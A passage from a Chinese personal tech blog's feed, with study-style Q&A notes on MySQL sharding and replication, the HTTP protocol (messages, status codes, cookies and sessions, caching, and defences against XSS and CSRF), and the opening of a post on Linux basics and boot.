  &lt;p&gt;垂直切分的最大特点就是规则简单，实施也更为方便，尤其适合各业务之间的耦合度非常低，相互影响很小，业务逻辑非常清晰的系统。在这种系统中，可以很容易做到将不同业务模块所使用的表分拆到不同的数据库中。根据不同的表来进行拆分，对应用程序的影响也更小，拆分规则也会比较简单清晰。（这也就是所谓的”share nothing”）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;垂直切分后，需要对shard内表格的数据量和增速进一步分析，以确定是否需要进行水平切分。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;如何设置水平拆分的hash算法&quot;&gt;如何设置水平拆分的hash算法？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;Range拆分
sharding key按连续区间段路由，一般用在有严格自增ID需求的场景上，如Userid, Userid Range的小例子：以userid 3000W 为Range进行拆分   1号cluster  userid 1-3000W  2号cluster  userid   3001W-6000W&lt;/li&gt;
  &lt;li&gt;List拆分
List拆分与Range拆分思路一样，都是通过给不同的sharding key来路由到不同的cluster,但是具体方法有些不同,List主要用来做sharding key不是连续区间的序列落到一个cluster的情况&lt;/li&gt;
  &lt;li&gt;Hash拆分
通过对sharding key 进行哈希的方式来进行拆分，常用的哈希方法有除余,字符串哈希等等，除余如按userid%n 的值来决定数据读写哪个cluster，其他哈希类算法这里就不细展开讲了。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;设置水平拆分的原则是什么&quot;&gt;设置水平拆分的原则是什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;数据库表水平拆分是非常复杂的，需要综合各个方面考虑完善，套用网友cauherk的说法“系统的切分是个很复杂的技术活，要综合考虑，而不仅仅从数据库层面考虑。业务的使用、分库的原则、数据的割接、开发的侵入、可操作的易难程度、后期的管理等等都是需要考虑的因素。”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;设置垂直拆分的原则是什么&quot;&gt;设置垂直拆分的原则是什么？&lt;/h2&gt;

&lt;p&gt;垂直切分的依据原则是：将业务紧密，表间关联密切的表划分在一起，例如同一模块的表。&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;mysql读写分离&quot;&gt;MySQL读写分离&lt;/h1&gt;

&lt;h2 id=&quot;设置数据库读写分离的原因是什么&quot;&gt;设置数据库读写分离的原因是什么？&lt;/h2&gt;

&lt;p&gt;1.增加冗余
2.增加了机器的处理能力（硬件资源增加了）
3.对于读操作为主的应用，使用读写分离是最好的场景…..因为可以确保写的服务器压力更小….而读又可以接受点时间上的延迟&lt;/p&gt;

&lt;h2 id=&quot;如何设置mysql的主从同步&quot;&gt;如何设置MySQL的主从同步&lt;/h2&gt;

&lt;h2 id=&quot;php如何写代码才能满足查询时调用读库写入更新时调用写库&quot;&gt;PHP如何写代码才能满足查询时调用读库，写入更新时调用写库？&lt;/h2&gt;

&lt;h2 id=&quot;写库和读库能不能实时同步如果不能实时同步而业务要求高必须要同步看到更新的数据怎么办&quot;&gt;写库和读库能不能实时同步？如果不能实时同步而业务要求高必须要同步看到更新的数据怎么办？&lt;/h2&gt;

&lt;p&gt;强制读主库&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;mysql高可用方案&quot;&gt;MySQL高可用方案&lt;/h1&gt;

&lt;h2 id=&quot;什么是mysql的高可用怎么才能高可用&quot;&gt;什么是MySQL的高可用，怎么才能高可用？&lt;/h2&gt;

&lt;h2 id=&quot;当主服务器down掉后如何才能让备用服务器立即提供服务&quot;&gt;当主服务器down掉后，如何才能让备用服务器立即提供服务？&lt;/h2&gt;

&lt;p&gt;heartbeat + keepalive&lt;/p&gt;

&lt;h2 id=&quot;主服务器与备用服务器之间的数据如何同步&quot;&gt;主服务器与备用服务器之间的数据如何同步？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;二进制日志&lt;/li&gt;
  &lt;li&gt;文件共享 rsync&lt;/li&gt;
  &lt;li&gt;块共享 DRBD&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;http://gpshumano.blogs.dri.pt/2009/07/06/mysql-datetime-vs-timestamp-vs-int-performance-and-benchmarking-with-myisam/&quot;&gt;MySQL DATETIME vs TIMESTAMP vs INT performance and benchmarking with MyISAM&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://gpshumano.blogs.dri.pt/2009/07/06/mysql-datetime-vs-timestamp-vs-int-performance-and-benchmarking-with-innodb/&quot;&gt;MySQL DATETIME vs TIMESTAMP vs INT performance and benchmarking with InnoDB&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://coolshell.cn/articles/652.html&quot;&gt;MySQL: InnoDB 还是 MyISAM?&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.zhdba.com/mysqlops/2012/03/21/mysql-data-type-set-enum-bool/&quot;&gt;MySQL数据库之布尔类型、枚举类型和集合类型的应用场景详解&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.searchtb.com/2010/09/mysql%E8%A1%8C%E9%94%81%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6-2.html&quot;&gt;MySQL行锁深入研究&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.woqutech.com/?p=769&quot;&gt;MYSQL数据丢失讨论&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://blog.csdn.net/seven_3306/article/details/27085275&quot;&gt;MySQL InnoDB四个事务级别 与 脏读、不重复读、幻读&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://code.tutsplus.com/tutorials/pdo-vs-mysqli-which-should-you-use--net-24059&quot;&gt;PDO vs. MySQLi: Which Should You Use?&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://kb.cnblogs.com/page/45712/&quot;&gt;漫谈数据库索引&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://blog.codinglabs.org/articles/theory-of-mysql-index.html&quot;&gt;MySQL索引背后的数据结构及算法原理&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://tech.meituan.com/mysql-index.html&quot;&gt;MySQL索引原理及慢查询优化&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.cnitblog.com/aliyiyi08/archive/2008/09/09/48878.html&quot;&gt;Mysql Explain 详解&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://coolshell.cn/articles/1846.html&quot;&gt;MySQL性能优化的最佳20+条经验&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://blog.csdn.net/bluishglc/article/details/6161475&quot;&gt;数据库Sharding的基本思想和切分策略&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://blog.sae.sina.com.cn/archives/4356&quot;&gt;MySQL在大型网站的应用架构演变&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.uml.org.cn/sjjm/201211212.asp&quot;&gt;数据库分库分表(sharding)系列&lt;/a&gt;\&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>深入HTTP协议</title>
   <link href="http://yanpeipan.github.io/2014/12/28/%E6%B7%B1%E5%85%A5HTTP%E5%8D%8F%E8%AE%AE.html"/>
   <updated>2014-12-28T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2014/12/28/深入HTTP协议</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;协议的表达方式&quot;&gt;协议的表达方式&lt;/h1&gt;

&lt;h2 id=&quot;什么是协议&quot;&gt;什么是协议？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;网络传输协议或简称为传送协议（Communications Protocol），是指计算机通信或网络设备的共同语言。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;协议一般都包括哪些内容&quot;&gt;协议一般都包括哪些内容？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;语法：即数据与控制信息的结构或格式；&lt;/li&gt;
  &lt;li&gt;语义：即需要发出何种控制信息，完成何种动作以及做出何种响应；&lt;/li&gt;
  &lt;li&gt;时序（同步），即事件实现顺序的详细说明。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;如何创建一个协议&quot;&gt;如何创建一个协议？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;http协议的作用&quot;&gt;HTTP协议的作用&lt;/h1&gt;

&lt;h2 id=&quot;我们可以用http协议做什么事情&quot;&gt;我们可以用HTTP协议做什么事情？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;超文本传输协议（英文：HyperText Transfer Protocol，缩写：HTTP）是互联网上应用最为广泛的一种网络协议。设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法。通过HTTP或者HTTPS协议请求的资源由统一资源标识符（Uniform Resource Identifiers，URI）来标识。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;http协议包括的内容&quot;&gt;HTTP协议包括的内容&lt;/h1&gt;

&lt;h2 id=&quot;http协议的执行流程是什么&quot;&gt;HTTP协议的执行流程是什么？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;连接 当我们输入这样一个请求时，首先要建立一个socket连接，因为socket是通过ip和端口建立的，所以之前还有一个DNS解析过程，把www.mycompany.com 变成ip，如果url里不包含端口号，则会使用该协议的默认端口号。&lt;/li&gt;
  &lt;li&gt;请求 连接成功建立后，开始向web服务器发送请求&lt;/li&gt;
  &lt;li&gt;应答 web服务器收到这个请求，进行处理。&lt;/li&gt;
  &lt;li&gt;关闭连接：当应答结束后，Web浏览器与Web服务器断开连接&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;http协议包括哪些内容&quot;&gt;HTTP协议包括哪些内容？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;请求报文&lt;/li&gt;
  &lt;li&gt;响应报文&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;http协议格式是什么样的&quot;&gt;HTTP协议格式是什么样的？&lt;/h2&gt;

&lt;p&gt;Client request&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /index.html HTTP/1.1
Host: www.example.com
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Server response&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Mon, 23 May 2005 22:38:34 GMT
Server: Apache/1.3.3.7 (Unix) (Red-Hat/Linux)
Last-Modified: Wed, 08 Jan 2003 23:11:55 GMT
ETag: &quot;3f80f-1b6-3e1cb03b&quot;
Content-Type: text/html; charset=UTF-8
Content-Length: 131
Accept-Ranges: bytes
Connection: close

&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
  &amp;lt;title&amp;gt;An Example Page&amp;lt;/title&amp;gt;
  &amp;lt;/head&amp;gt;
  &amp;lt;body&amp;gt;
  Hello World, this is a very simple HTML document.
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;http协议中的头域有哪些内容&quot;&gt;HTTP协议中的头域有哪些内容？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;通用头域包含Cache-Control、Connection、Date、Pragma、Transfer-Encoding、Upgrade、Via&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;http协议中的状态码有哪些&quot;&gt;HTTP协议中的状态码有哪些？&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;1xx消息&lt;/strong&gt;&lt;br /&gt;
这一类型的状态码，代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。由于HTTP/1.0协议中没有定义任何1xx状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送1xx响应。 这些状态码代表的响应都是信息性的，标示客户应该采取的其他行动。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2xx成功&lt;/strong&gt;&lt;br /&gt;
这一类型的状态码，代表请求已成功被服务器接收、理解、并接受。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3xx重定向&lt;/strong&gt;&lt;br /&gt;
这类状态码代表需要客户端采取进一步的操作才能完成请求。通常，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的Location域中指明。
当且仅当后续的请求所使用的方法是GET或者HEAD时，用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求。客户端应当自动监测无限循环重定向（例如：A→B→C→……→A或A→A），因为这会导致服务器和客户端大量不必要的资源消耗。按照HTTP/1.0版规范的建议，浏览器不应自动访问超过5次的重定向。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4xx客户端错误&lt;/strong&gt;&lt;br /&gt;
这类的状态码代表了客户端看起来可能发生了错误，妨碍了服务器的处理。除非响应的是一个HEAD请求，否则服务器就应该返回一个解释当前错误状况的实体，以及这是临时的还是永久性的状况。这些状态码适用于任何请求方法。浏览器应当向用户显示任何包含在此类错误响应中的实体内容。
如果错误发生时客户端正在传送数据，那么使用TCP的服务器实现应当仔细确保在关闭客户端与服务器之间的连接之前，客户端已经收到了包含错误信息的数据包。如果客户端在收到错误信息后继续向服务器发送数据，服务器的TCP栈将向客户端发送一个重置数据包，以清除该客户端所有还未识别的输入缓冲，以免这些数据被服务器上的应用程序读取并干扰后者。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5xx服务器错误&lt;/strong&gt;&lt;br /&gt;
这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理。除非这是一个HEAD请求，否则服务器应当包含一个解释当前错误状态以及这个状况是临时的还是永久的解释信息实体。浏览器应当向用户展示任何在当前响应中被包含的实体。
这些状态码适用于任何响应方法。&lt;/p&gt;

&lt;h2 id=&quot;http协议中get和post有什么不一样&quot;&gt;HTTP协议中GET和POST有什么不一样？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;根据HTTP规范，GET用于信息获取，而且应该是安全的和幂等的 。
根据HTTP规范，POST表示可能修改变服务器上的资源的请求 。
POST的安全性要比GET的安全性高。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;cookie和session&quot;&gt;COOKIE和SESSION&lt;/h1&gt;

&lt;h2 id=&quot;cookie是什么&quot;&gt;COOKIE是什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cookie（复数形态Cookies），中文名称为小型文本文件或小甜饼[1]，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;cookie在两个不同的子域名aabccom和babccom中可以相互调用吗&quot;&gt;COOKIE在两个不同的子域名a.abc.com和b.abc.com中可以相互调用吗？&lt;/h2&gt;

&lt;p&gt;Cookies域设置为abc.com或.abc.com&lt;/p&gt;

&lt;h2 id=&quot;cookie的存储是安全的吗&quot;&gt;COOKIE的存储是安全的吗？&lt;/h2&gt;

&lt;h2 id=&quot;session是什么&quot;&gt;SESSION是什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;会话（session）是一种持久网络协议，在用户（或用户代理）端和服务器端之间创建关联，从而起到交换数据包的作用机制，session在网络协议（例如telnet或FTP）中是非常重要的部分。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;session是怎么工作的&quot;&gt;SESSION是怎么工作的？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;PHP会用session_start()函数为用户创建一个session ID，这就是针对这个用户的唯一标识，每一个访问的用户都会得到一个自己独有的session ID，这个session ID会存放在响应头里的cookie中，之后发送给客户端。这样客户端就会拥有一个该站点给他的session ID。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;当用户第二次访问该站点时，浏览器会带着本地存放的cookie(里面存有上次得到的session ID)随着请求一起发送到服务器，服务端接到请求后会检测是否有session ID，如果有就会找到响应的session文件，把其中的信息读取出来；如果没有就跟第一次一样再创建个新的。&lt;/p&gt;

&lt;h2 id=&quot;session存储在哪里存储的格式是怎么样的呢&quot;&gt;SESSION存储在哪里？存储的格式是怎么样的呢？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;session.save_path
&lt;code&gt;session_set_save_handler&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;session.serialize_handler 定义用来序列化／解序列化的处理器名字。当前支持 PHP 内部格式（名为 php）和 WDDX（名为 wddx）。如果 PHP 编译时加入了 WDDX 支持，则只能用 WDDX。默认为 php。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;session和cookie是什么关系&quot;&gt;SESSION和COOKIE是什么关系？&lt;/h2&gt;

&lt;p&gt;session实际上是依赖与cookie的，当用户访问某一站点时，浏览器会根据用户访问的站点自动搜索可用的cooki&lt;/p&gt;

&lt;h2 id=&quot;如何设置session严格的过期时间&quot;&gt;如何设置SESSION严格的过期时间？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;设置Cookie过期时间30分钟, 并设置Session的lifetime也为30分钟.&lt;/li&gt;
  &lt;li&gt;自己为每一个Session值增加Time stamp.&lt;/li&gt;
  &lt;li&gt;每次访问之前, 判断时间戳.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;多服务器之间session如何共享&quot;&gt;多服务器之间SESSION如何共享？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;不使用session，换作cookie&lt;/li&gt;
  &lt;li&gt;应用服务器自行实现共享，用数据库或memcached来保存session&lt;/li&gt;
  &lt;li&gt;nginx中的ip_hash技术能够将某个ip的请求定向到同一台后端&lt;/li&gt;
  &lt;li&gt;upstream_hash&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;http性能优化&quot;&gt;HTTP性能优化&lt;/h1&gt;

&lt;h2 id=&quot;跟缓存相关的头域有哪些&quot;&gt;跟缓存相关的头域有哪些？&lt;/h2&gt;

&lt;p&gt;Request&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cache-Control: max-age=0以秒为单位&lt;/li&gt;
  &lt;li&gt;If-Modified -Since: Mon, 19 Nov 2012 08:38:01 GMT缓存文件的最后修改时间 。&lt;/li&gt;
  &lt;li&gt;If-None-Match: “0693f67a67cc1:0”缓存文件的Etag值&lt;/li&gt;
  &lt;li&gt;Cache-Contr ol: no-cache不使用缓存&lt;/li&gt;
  &lt;li&gt;Pragma: no-cache不使用缓存&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Response&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cache-Control: public响应被缓存，并且在多用户间共享&lt;/li&gt;
  &lt;li&gt;Cache-Control: privateå应只能作为私有缓存，不能在用户之间共享&lt;/li&gt;
  &lt;li&gt;Cache-Control:no-cache提醒浏览器要从服务器提取文档进行验证&lt;/li&gt;
  &lt;li&gt;Cache -Control:no-store绝对禁止缓存（用于机密，敏感文件）&lt;/li&gt;
  &lt;li&gt;Cache-Control: max-age=6060秒之后缓存过期（相对时间）&lt;/li&gt;
  &lt;li&gt;Date  : Mon, 19 Nov 2012 08:39:00 GMT当前response发送的时间&lt;/li&gt;
  &lt;li&gt;Expires:  Mon, 19 Nov 2012 08:40:01 GMT缓存过期的时间（绝对时间）&lt;/li&gt;
  &lt;li&gt;L ast-Modified: Mon, 19 Nov 2012 08:38:01 GMT服务器端文件的最后 修改时间&lt;/li&gt;
  &lt;li&gt;ETag: “20b1add7ec1cd1:0”服务器端文件的Etag值&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;如何在php中设置分块传输&quot;&gt;如何在PHP中设置分块传输？&lt;/h2&gt;

&lt;p&gt;ob_flush() 与 flush() 将缓冲区的内容提前输出，浏览器可提早加载这部分的内容，无需等待所有输出完成再加载。&lt;/p&gt;

&lt;h2 id=&quot;如何在php中设置只读请求实体内容的前512个字符&quot;&gt;如何在PHP中设置只读请求实体内容的前512个字符？&lt;/h2&gt;

&lt;p&gt;fgets($a,512);&lt;/p&gt;

&lt;h2 id=&quot;如何用压缩内容浏览器怎么知道如何解压缩&quot;&gt;如何用压缩内容，浏览器怎么知道如何解压缩？&lt;/h2&gt;

&lt;p&gt;Request:
&lt;code&gt;Accept-Encoding:gzip&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Response:
&lt;code&gt;Content-Encoding: gzip&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;http安全&quot;&gt;HTTP安全&lt;/h1&gt;

&lt;h2 id=&quot;如何避免xss攻击&quot;&gt;如何避免XSS攻击？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;XSS 全称为 Cross Site Scripting，因为 CSS 已经用作样式表的简称，故称为 XSS。 XSS 是一种常见的网站攻击的方法。其原理是通过在网页的输入框输入一些恶意的内容，通常是 JavaScript 脚本片段，而这些恶意输入在提交之后并重新读回到客户端时，浏览器会解释执行这些恶意的脚本内容，从而影响网页的正常显示。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;过滤特殊字符&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;避免XSS的方法之一主要是将用户所提供的内容进行过滤，Go语言提供了HTML的过滤函数：&lt;/p&gt;

&lt;p&gt;text/template包下面的HTMLEscapeString、JSEscapeString等函数&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;使用HTTP头指定类型&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;w.Header().Set(“Content-Type”,”text/javascript”)&lt;/p&gt;

&lt;p&gt;这样就可以让浏览器解析javascript代码，而不会是html输出。&lt;/p&gt;

&lt;h2 id=&quot;如何避免csrf攻击&quot;&gt;如何避免csrf攻击？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;验证 HTTP Referer 字段&lt;/li&gt;
  &lt;li&gt;在请求地址中添加 token 并验证&lt;/li&gt;
  &lt;li&gt;在 HTTP 头中自定义属性并验证&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;如何避免sniffer&quot;&gt;如何避免sniffer？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Sniffer，中文可以翻译为嗅探器，是一种基于被动侦听原理的网络分析方式。使用这种技术方式，可以监视网络的状态、数据流动情况以及网络上传输的信息。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;使用检测工具 Tripwire&lt;/li&gt;
  &lt;li&gt;会话加密 https&lt;/li&gt;
  &lt;li&gt;注意网络异常 ping掉包&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;http://www.w3.org/Protocols/&quot;&gt;HTTP - Hypertext Transfer Protocol&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.laruence.com/2012/01/10/2469.html&quot;&gt;如何设置一个严格30分钟过期的Session&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.cnblogs.com/skynet/archive/2012/11/28/2792503.html&quot;&gt;浏览器缓存机制&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.cnblogs.com/tankxiao/archive/2012/11/28/2793365.html#gainian&quot;&gt;HTTP协议 (四) 缓存&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-httpiis/&quot;&gt;启用动态 HTTP 压缩&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.ibm.com/developerworks/cn/opensource/os-cn-php-xss/&quot;&gt;使用 PHP 构建的 Web 应用如何避免 XSS 攻击&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.3.md&quot;&gt;避免XSS攻击&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.rising.com.cn/newsletter/news/2011-08-18/9621.html&quot;&gt;从新浪微博被攻击事件看SNS网站的安全问题&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/&quot;&gt;CSRF 攻击的应对之道&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://astaxie.gitbooks.io/build-web-application-with-golang/content/zh/09.1.html&quot;&gt;预防CSRF攻击&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Linux原理和使用</title>
   <link href="http://yanpeipan.github.io/2014/12/26/linux%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8.html"/>
   <updated>2014-12-26T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2014/12/26/linux原理和使用</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;linux哲学思想&quot;&gt;Linux哲学思想&lt;/h1&gt;

&lt;h2 id=&quot;linux是怎样诞生的&quot;&gt;Linux是怎样诞生的？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Linux（收听i英语发音：/ˈlɪnəks/ LIN-əks）是一种自由和开放源代码的类UNIX操作系统。该操作系统的内核由林纳斯·托瓦兹在1991年10月5日首次发布。[5][6]，在加上用户空间的应用程序之后，成为Linux操作系统。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;术语Linux只表示操作系统内核本身，但通常采用Linux内核来表达该意思。Linux则常用来指基于Linux内核的完整操作系统，包括GUI组件和许多其他实用工具。由于这些支持用户空间的系统工具和库主要由理查德·斯托曼于1983年发起的GNU计划提供，自由软件基金会提议将该组合系统命名为GNU/Linux[7][8]，但Linux不属于GNU计划。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;linux中的软件在开发时通常遵循着哪些原则&quot;&gt;Linux中的软件在开发时通常遵循着哪些原则？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;一切皆文件&lt;/li&gt;
  &lt;li&gt;由众多目的单一的应用程序组成，一个程序只做一件事&lt;/li&gt;
  &lt;li&gt;组合目的单一的小程序完成复杂任务&lt;/li&gt;
  &lt;li&gt;尽量避免捕捉用户接口&lt;/li&gt;
  &lt;li&gt;提供机制而非策略&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;linux中的软件有什么共同特征&quot;&gt;Linux中的软件有什么共同特征？&lt;/h2&gt;

&lt;p&gt;自由，免费，开源&lt;/p&gt;

&lt;h2 id=&quot;怎样学习linux&quot;&gt;怎样学习Linux？&lt;/h2&gt;

&lt;p&gt;Linux From Scratch (LFS) 从头来&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;linux基础知识&quot;&gt;Linux基础知识&lt;/h1&gt;

&lt;h2 id=&quot;linux中的文件是怎么样组织存放的&quot;&gt;Linux中的文件是怎么样组织存放的？&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/image/linux_file_structure.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Linux系统将它的重要文件按照一个标准的分布进行存储，这种摆放系统文件的方法叫做文件系统的层次标准，即 Filesystem Hierarchy Standard （FHS）。&lt;br /&gt;
Linux用符号 ‘/’ 来表示路径间的分隔符（不像Windows，用 ‘' 符号）&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;linux系统的启动流程是怎么样的&quot;&gt;Linux系统的启动流程是怎么样的？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;加载内核&lt;/strong&gt; 操作系统接管硬件以后，首先读入 /boot 目录下的内核文件。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;启动初始化进程&lt;/strong&gt; 内核文件加载以后，就开始运行第一个程序 /sbin/init，它的作用是初始化系统环境。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;确定运行级别&lt;/strong&gt; 许多程序需要开机启动。它们在Windows叫做”服务”（service），在Linux就叫做”守护进程”（daemon）。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;加载开机启动程序&lt;/strong&gt; 七种预设的”运行级别”各自有一个目录，存放需要开机启动的程序。七个 /etc/rcN.d 目录里列出的程序，都设为链接文件，指向另外一个目录 /etc/init.d ，真正的启动脚本都统一放在这个目录中。init进程逐一加载开机启动程序，其实就是运行这个目录里的启动脚本&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;用户登录&lt;/strong&gt; 一般来说，用户的登录方式有三种：命令行登录, ssh登录, 图形界面登录
这三种情况，都有自己的方式对用户进行认证。&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;命令行登录：init进程调用getty程序（意为get teletype），让用户输入用户名和密码。输入完成后，再调用login程序，核对密码（Debian还会再多运行一个身份核对程序/etc/pam.d/login）。如果密码正确，就从文件 /etc/passwd 读取该用户指定的shell，然后启动这个shell。&lt;/li&gt;
    &lt;li&gt;ssh登录：这时系统调用sshd程序（Debian还会再运行/etc/pam.d/ssh ），取代getty和login，然后启动shell。&lt;/li&gt;
    &lt;li&gt;图形界面登录：init进程调用显示管理器，Gnome图形界面对应的显示管理器为gdm（GNOME Display Manager），然后用户输入用户名和密码。如果密码正确，就读取/etc/gdm3/Xsession，启动用户的会话。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
